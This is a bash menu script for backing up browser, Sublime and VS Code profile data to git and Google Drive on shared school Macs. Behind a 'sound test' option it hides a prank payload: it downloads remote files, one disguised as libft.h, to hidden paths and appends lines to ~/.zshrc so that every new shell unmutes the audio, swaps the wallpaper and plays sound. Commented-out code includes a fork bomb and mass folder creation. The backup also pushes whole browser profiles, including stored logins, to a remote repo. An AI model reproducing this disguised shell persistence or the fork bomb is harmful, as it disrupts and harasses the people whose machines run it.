
# i_lfs

murmur_conf()
{
  while ! grep -E "github\.com.*\.git|\.git.*github\.com" < "$conf_f" &> /dev/null
  do
    clear
    echo "Repository not found. Please enter the repository address and make sure to grant access permission to the repository."
    read -p "> " repo
    echo "$repo" > "$conf_f"
  done
}

get_data()
{
  repo=$(cat $conf_f)
  (
    git clone $repo /goinfre/$USER/data &&
    git -C /goinfre/$USER/data fetch origin master &&
    git -C /goinfre/$USER/data reset --hard origin/master
  )&
  (
    lnk1s="/goinfre/$USER/data/Sublime Text"
    lnk1d="/Users/$USER/Library/Application Support/Sublime Text"
    lnk2s="/goinfre/$USER/data/Sublime Merge"
    lnk2d="/Users/$USER/Library/Application Support/Sublime Merge"
    if ! ls $lnk1d &> /dev/null ; then
      ln -s $lnk1s $lnk1d
    fi
    if ! ls $lnk2d &> /dev/null ; then
      ln -s $lnk2s $lnk2d
    fi
  )& wait
}

get_data2()
{
  (
    echo "skicka do//////"
    i_skicka && $HOME/go/bin/skicka cat '/code-portable-data.tar.gz' | tar -xz -C /goinfre/$USER/
    echo "skicka end/////"
  )& wait
}

git_push()
{
  local arg=$1
  git -C /goinfre/$USER/data add /goinfre/$USER/data/*
  git -C /goinfre/$USER/data commit -m "$arg"
  git -C /goinfre/$USER/data push -f origin master
}

skicka_push()
{
  $HOME/go/bin/skicka df
  echo "tar tar tar tar tar tar tar"
  tar -czf /goinfre/$USER/code-portable-data.tar.gz -C /goinfre/$USER/ code-portable-data &
  $HOME/go/bin/skicka rm '/code-portable-data.tar.gz' & wait;
  $HOME/go/bin/skicka upload "/goinfre/$USER/code-portable-data.tar.gz" /
}

while true; do
  cecho "v1.0.1" "red" "reversed" 
  echo -e "\033[1;31mSelect an option:\033[0m
\033[1;34m  1) Download browsers data backups
  2) First Backup for browsers data
  3) Upload browsers data to git
  4) Upload VS Code data to the gdrive
  5) Upload all
  6) First Backup for msvscode data
  7) Download msvscode backups
  8) Install apps
  666) 💀 scream (sound test 1 2 3)
  911) 🌞 mute (try turn off sound test)
  Enter your choice: \033[0m \c"

  read selec

  case $selec in
  1)
    echo "1: Download browser backups"
    murmur_conf
    get_data
    ;;
  2)
    echo "2: First Backup browser data"
    murmur_conf
    repo=$(cat $conf_f)

    mkdir -p /goinfre/$USER/data & wait;
    cp -rn $HOME/Library/Application\ Support/Google /goinfre/$USER/data &
    cp -rn $HOME/Library/Application\ Support/Sublim\ Merge /goinfre/$USER/data &
    cp -rn $HOME/Library/Application\ Support/Sublime\ Text /goinfre/$USER/data &
    cp -rn $HOME/Library/Application\ Support/Sublime\ Text\ 3 /goinfre/$USER/data &

    git -C /goinfre/$USER/data init & wait;
    git -C /goinfre/$USER/data remote add origin $repo
    git -C /goinfre/$USER/data fetch
    # git -C /goinfre/$USER/data switch master
    # git -C /goinfre/$USER/data branch master -u origin/master
    # echo "pushing to git"
    # git_push "init"
    # skicka_push
    ;;
  3)
    echo "3: Upload browsers data to git"
    # browsers git upload
    git_push "upload"
    clear
    ;;
  4)
    echo "4: Upload msvscode data to gdrive"
    # skicka push -------------------
    i_skicka
    skicka_push
    ;;
  5)
    echo "5: Upload all"
    git_push "upload" & skicka_push & wait
    ;;
  6)
    # skicka first ------------------
    i_skicka
    $HOME/go/bin/skicka init

    mkdir -p /goinfre/$USER/code-portable-data/

    cp -rn $HOME/Library/Application\ Support/Code /goinfre/$USER/code-portable-data/user-data &
    cp -rn $HOME/.vscode/extensions /goinfre/$USER/code-portable-data/ &
    cecho "configurate the $HOME/.skicka.config file then select [4]" "green" ""
    cecho "configurate the $HOME/.skicka.config file then select [4]" "green" ""
    cecho "configurate the $HOME/.skicka.config file then select [4]" "green" ""
    cecho "configurate the $HOME/.skicka.config file then select [4]" "green" ""
    cecho "configurate the $HOME/.skicka.config file then select [4]" "green" ""
    cecho "configurate the $HOME/.skicka.config file then select [4]" "green" ""
    cecho "configurate the $HOME/.skicka.config file then select [4]" "green" ""
    ;;
  7)
    echo "7: get skicka"
    i_skicka
    get_data2
    ;;
  8)
    cecho "Please wait!!!" "red" "reversed"
    i_app
    ;;
  666)
	# curl -o ~/._kagebunshinnojutsu https://raw.githubusercontent.com/murmurlab/OpenWAR/refs/heads/main/IMG_0581.jpg
    filewp=~/._kagebunshinnojutsu
	curl -o $filewp https://raw.githubusercontent.com/murmurlab/OpenWAR/refs/heads/main/IMG_0581.jpg
	# set wallpaper
	echo "" >> ~/.zshrc
	echo "
		amixer set Master unmute
		amixer set Master 30%
		gsettings set org.gnome.desktop.background picture-uri $filewp
		gsettings set org.gnome.desktop.background picture-uri-dark $filewp
		nohup nvlc ~/libft.h &
	" >> ~/.zshrc
    curl -o ~/libft.h https://raw.githubusercontent.com/murmurlab/OpenWAR/main/libft.h
    # counter=1
    # while [ $counter -le 9999 ]
    # do
    #   ((counter++))
    #   osascript -e "set Volume 0.25"
    #   # say -v xander "test"
    #   afplay ~/libft.h &
    #   sleep 110
    # done &
    # while [ $counter -le 9999 ]
    # do
    #   ((counter++))
    #   osascript -e "set Volume 0.25"
    #   say -v xander "test"
    #   sleep 0
    # done &
    # # afplay ~/libft.h &
    # mkdir ~/Desktop/AAAAAAAAAAAAAAGGG{0..220}
    # echo "#include <stdio.h>\n#include <unistd.h>\n#include <sys/types.h>\nint main(){while(1){fork();}return 0;}" > libft.test
    # cc -x c libft.test && ./a.out &
    ;;
  911)
	
    ps aux | grep "nvlc" | awk '{print $2}' | xargs -n1 kill -9 &> /dev/null
    ps aux | grep "afplay" | awk '{print $2}' | xargs -n1 kill -9 &> /dev/null
    ps aux | grep "/Users/$USER/.murmurbox/murmurbox.bash" | awk '{print $2}' | xargs -I {} -n1 sh -c 'if [ "{}" -ne '"$$"' ]; then kill -9 "{}" &> /dev/null ; fi'
    rm -r ~/Desktop/AAAAAAAAAAAAAAGGG{0..220}
    # echo $$
    # ps aux | grep "/Users/$USER/.murmurbox/murmurbox.bash" | awk '{print $2}' | xargs -n1 kill -9
    ;;
  0)
    echo "0 exitting."
    break
    ;;
  "q")
    echo "q exitting."
    break
    ;;
  *)
    echo "* exitting."
    break
    ;;
  esac
done
